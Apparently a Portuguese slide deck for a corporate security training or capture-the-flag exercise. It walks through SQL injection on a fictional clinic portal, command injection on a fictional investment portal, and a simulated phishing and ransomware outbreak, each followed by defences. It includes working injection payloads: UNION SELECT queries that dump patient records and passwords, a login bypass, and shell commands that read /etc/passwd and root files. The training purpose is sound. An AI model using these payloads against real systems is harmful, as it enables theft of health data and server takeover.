// CENÁRIO 01

SQL Injection

MedClinic · Portal do Paciente

Primeiro cenário: um portal de clínica, coisa que todo mundo já usou para ver resultado de exame.

// Cenário 01 · Intro

Um portal que todo mundo já usou

O que o paciente vê

Perfil · Convênio · Consultas · Receitas · Exames

Depois do login, cada paciente enxerga só os próprios dados.

Onde está o risco

Uma busca “nos meus exames”.

Um campo de texto comum, em que o paciente digita o nome de um exame.

Pergunte: quantos aqui já usaram um portal assim? A busca parece a coisa mais inofensiva da tela.

// Cenário 01 · Como funciona

Uma busca é uma pergunta ao banco

Banco de dados

Onde o sistema guarda tudo: pacientes, exames, logins.

Tabela

Uma planilha dentro do banco. Ex.: exames, uma linha por exame.

Query (consulta SQL)

A pergunta que o sistema faz ao banco para trazer os dados.

SELECT data, exame, resultado FROM exames
WHERE  paciente_id = 42                 ← o sistema põe: você
  AND  exame LIKE '%colesterol%'      ← você digita

Resultado normal: os 2 exames de colesterol da paciente 42. Nada mais.

SQL é a língua dos bancos de dados. A parte verde quem decide é o sistema; a parte laranja vem de você. Guarde essa imagem: o problema está na fronteira entre as duas.

// Cenário 01 · A falha

E se o que você digita mudar a pergunta?

Em vez de um exame, digite: ' OR 1=1 #

WHERE  paciente_id = 42
  AND  exame LIKE '%' OR 1=1 #%'

'

Fecha o texto antes da hora.

OR 1=1

“…ou 1 é igual a 1”: sempre verdade, para qualquer paciente.

#

Manda o banco ignorar o resto da linha.

O filtro “só os meus exames” existe apenas dentro da consulta. Se a consulta pode ser reescrita pelo usuário, o filtro deixa de existir.

// Mensagem para o gestor

Um campo de busca.
~1000 prontuários.

Um paciente comum, logado na própria conta, lê nome, CPF, telefone, diagnósticos e sorologias, inclusive HIV, de outras pessoas.

Dado sensível de saúde vazado: LGPD, reputação e risco jurídico.

Pause. Quanto custaria uma manchete dessas? Não foi preciso invadir servidor nenhum, só digitar numa busca.

// Cenário 01 · Código vulnerável

O porquê técnico, em 4 linhas

// busca nos exames do paciente logado (trecho simplificado)
sql = "SELECT data, exame, resultado FROM exames " +
      "WHERE paciente_id = " + usuario.id +
      " AND exame LIKE '%" + busca + "%'"     ← entrada colada no comando
db.query(sql)

Concatenação

O texto do usuário vira parte do comando SQL.

Filtro só na query

Ninguém confere no servidor se o exame é seu.

Senhas em texto puro

Quem lê a tabela de usuários lê as senhas.

Slide opcional para gestores. Se a turma for menos técnica, passe rápido e foque nos três cartões.

// Cenário 01 · Exploração

Do normal ao vazamento em 4 passos

1Normal → só a própria paciente

2Quebrar o filtro → centenas de pacientes

3Extrair → CPF, e-mail e telefone

4Escalar → senhas em texto puro → admin

Bônus — bypass de login: usuário admin'# + qualquer senha

# 2 · quebrar o filtro (vaza tudo)
' OR 1=1 #

# 3 · vazar dados pessoais dos pacientes
' AND 1=2 UNION SELECT name, birthdate,
  cpf, email, phone FROM patients #

# 4 · roubar as credenciais (vira admin)
' AND 1=2 UNION SELECT username, '',
  password, role, fullname FROM users #
Para o UNION é preciso saber o número de colunas: ORDER BY 5 funciona, ORDER BY 6 dá erro, então são 5. No MySQL use # e não “-- ”, porque o formulário descarta o espaço que o -- exige. Payloads completos no roteiro técnico.

// Cenário 01 · Recap e prova

Um campo de busca virou um vazamento de saúde

O contador no topo da tela

1000

pacientes visíveis para um usuário comum, com CPF e diagnóstico.

A flag do cenário

FLAG{__C1_FLAG__}

Estava escondida na tabela secrets. Quem chegou lá: submeta no placar.

Payload da flag: ' AND 1=2 UNION SELECT flag, CURDATE(), 'secret', name, flag FROM secrets #. Mostre a tela de quem chegou primeiro.

// Cenário 01 · O que cobrar da TI

Como se proteger

Consultas parametrizadas

O que o usuário digita é sempre dado, nunca comando.

Autorização no servidor

O sistema confere quem pode ver o quê, não só a consulta.

Senhas com hash forte

Nunca guardar senha em texto puro.

// corrigido: a busca entra como parâmetro, separada do comando
db.query("... WHERE paciente_id = ? AND exame LIKE ?", [usuario.id, "%" + busca + "%"])

Pergunta para levar: nossos sistemas tratam o que o usuário digita como dado ou como comando?

Nenhuma dessas correções é cara. O caro é descobrir depois do vazamento.

Command
Injection

Meridian Capital · Portal do Investidor

Agora é a nossa empresa fictícia. E o alvo é uma função que parece inofensiva.

// Cenário 02 · Intro

A carteira inteira, num portal

O que o investidor vê

Patrimônio · Posições · Alocação · Transações

Tudo o que um cliente de gestora espera encontrar.

Onde está o risco

“Backup da carteira”

Exporta um arquivo para um destino que o próprio usuário digita.

Uma funcionalidade útil, pedida pelo negócio. Guarde isso.

// Cenário 02 · Como funciona

Por trás do botão, o servidor executa comandos

$ tar -czf carteira.tgz /dados/carteira-42          ← compacta a carteira
$ enviar carteira.tgz s3://meridian-backups/carteira   ← destino que você digitou

Comando

Uma ordem para o sistema operacional: programa + o que ele deve usar.

;

Separa ordens: “faça isto; depois, faça aquilo”.

root

O superusuário. Pode ler, apagar e instalar qualquer coisa.

Um terminal é só uma lista de ordens. O ponto e vírgula é a peça que vai importar no próximo slide.

// Cenário 02 · A falha

E se o destino trouxer uma ordem a mais?

Em vez de um destino, digite: x; id

$ enviar carteira.tgz x; id
  envio falhou: destino "x" inválido
  uid=0(root) gid=0(root) groups=0(root)

Duas ordens, não uma

O “x” vira destino; o “; id” vira um comando novo, executado no servidor.

uid=0(root)

A resposta mostra que o serviço roda como superusuário.

id é um comando inofensivo que só diz “quem sou eu”. A resposta é o problema: root.

// Mensagem para o gestor

Um botão de backup.
O servidor inteiro.

Execução de comandos como root: ler a base de carteiras de todos os clientes, criar usuários, instalar backdoor e avançar para a rede interna.

100%

do servidor sob
controle do atacante

Não foi um bug exótico, foi uma funcionalidade que o negócio pediu. Toda funcionalidade é superfície de ataque.

// Cenário 02 · Código vulnerável

O destino é colado direto no shell

# rota "Backup da carteira" (trecho simplificado)
destino = request.form["destino"]
os.system("tar -czf /tmp/carteira.tgz /dados && enviar /tmp/carteira.tgz " + destino)
# o serviço roda como root

Entrada no shell

Qualquer ; | ou && no campo injeta uma ordem nova.

Sem validação

O destino não precisa ter o formato esperado.

Privilégio máximo

Rodando como root, o estrago não tem limite.

Slide opcional. O ponto para gestores: três falhas pequenas somadas viram o pior caso.

// Cenário 02 · Exploração

De backup a root em 4 passos

1 Normal

s3://meridian-backups/carteira

o destino aparece colado no comando

2 Testar

x; id

uid=0(root): roda como superusuário

3 Ler

x; cat /etc/passwd

arquivos do sistema e usuários

4 Dominar

área do root, processos e base de clientes

Outros comandos para mostrar o alcance: uname -a; hostname; ps aux. A frase de fechamento: um campo de texto virou o servidor inteiro.

Dica

// Cenário 02 · Recap e prova

Um campo de texto virou o servidor inteiro

$ enviar carteira.tgz x; id
uid=0(root) gid=0(root)
$ enviar carteira.tgz x; ls -la /root
flag.txt  .ssh  carteiras.db  ...

A flag do cenário

FLAG{__C2_FLAG__}

Estava em /root/flag.txt, um arquivo que só o superusuário lê. Submeta no placar.

Comando da flag: x; cat /root/flag.txt. A listagem de /root no slide é ilustrativa; mostre a tela real de quem chegou primeiro.

// Cenário 02 · O que cobrar da TI

Como se proteger

Nada no shell

Entrada do usuário nunca vira parte de um comando.

Comando separado

APIs que executam o programa sem passar por um shell.

Lista do permitido

O destino só é aceito no formato esperado.

Privilégio mínimo

Nenhum serviço roda como root. Se cair, cai pequeno.

# corrigido: programa e argumentos separados, sem shell, sem root
subprocess.run(["enviar", "/tmp/carteira.tgz", destino])
Privilégio mínimo é o item que o gestor mais consegue cobrar sem entender de código: quais serviços rodam com acesso total, e por quê?

// Cenário 03 · Como funciona

O nome engana. O domínio, não.

De:      Suporte TI <suporte@meridian-ti.example>
Para:    você

Nome exibido

“Suporte TI”: qualquer um escreve o nome que quiser.

Gatilho

O golpe real não tem erro de português e logo torto. Ele usa a psicologia: autoridade, medo, pressa e recompensa.

// Mensagem para o gestor

Um clique.
E depois?

Um clique de um colaborador pode abrir a porta para roubo de credenciais, transferência fraudulenta (BEC) ou coisa pior.

A defesa mais barata e eficaz é gente treinada.

Nenhum firewall impede alguém de digitar a própria senha numa página falsa.

// Cenário 03 · Como o golpe engana

4 sinais de phishing

01

Domínio trocado

Letra a mais, letra trocada, domínio externo.

02

Pressão

Ameaça, bloqueio, consequência.

03

Urgência

Prazo curto, “agora”, “expira”.

04

Recompensa

Prêmio, dinheiro, benefício liberado.

Na dúvida, o que decide não é o tom: é o domínio e o canal.

Use estes 4 sinais como guia para a quest. Tom urgente, sozinho, não prova golpe.

// Cenário 03 · Recap e prova

Uma máquina caiu. Depois, a turma inteira.

Simulação: nada é criptografado. A tela se espalha, uma VM a cada 5 segundos, como num surto real.

20 de 20 máquinas bloqueadas

RANSOMWARE
ACTIVATED

DATA ENCRYPTED

Tela cheia na máquina do próprio participante. O kill-switch libera tudo na hora.

Momento de maior impacto. Se alguém cair na isca, o surto automático infecta as outras VMs. Se ninguém cair, dispare a cascata pelo painel. Deixe a turma sentir a tela por alguns segundos antes de reverter.

// Cenário 03 · O que cobrar da organização

Como se proteger

Treino recorrente

Simulações de phishing ao longo do ano.

MFA

Senha roubada sozinha não abre a porta.

Segundo canal

Pagamento só com confirmação por outro meio.

Camadas técnicas

Filtro de e-mail, aviso de externo, EDR e backup testado.

Canal de report

Todo mundo sabe onde avisar “recebi algo estranho”.

report > ignore

Quem reporta rápido encurta o ataque.

Pergunte: qual é hoje o nosso canal para reportar um e-mail suspeito? Se houver hesitação, esse é o primeiro ponto de ação.

// E se for de verdade?

O papel do líder nas primeiras horas

01 Acionar

Chame o time de resposta pelo canal oficial. Não resolva sozinho.

02 Conter

Apoie isolar o que foi afetado, mesmo que pare a operação.

03 Preservar

Não apague nada. Evidência explica o que aconteceu.

04 Priorizar

Pelo plano de continuidade: o que precisa voltar primeiro?

05 Comunicar

Uma voz só, com jurídico e comunicação. A LGPD exige avisar.

Resgate é decisão de diretoria, com jurídico e especialistas.

Dinâmica: “a tela bloqueada que vocês viram agora aconteceu na empresa inteira. Quem chama quem? O que volta primeiro?” Deixe a turma responder antes de mostrar os seis pontos. Ajuste canais e responsáveis para a realidade da empresa.
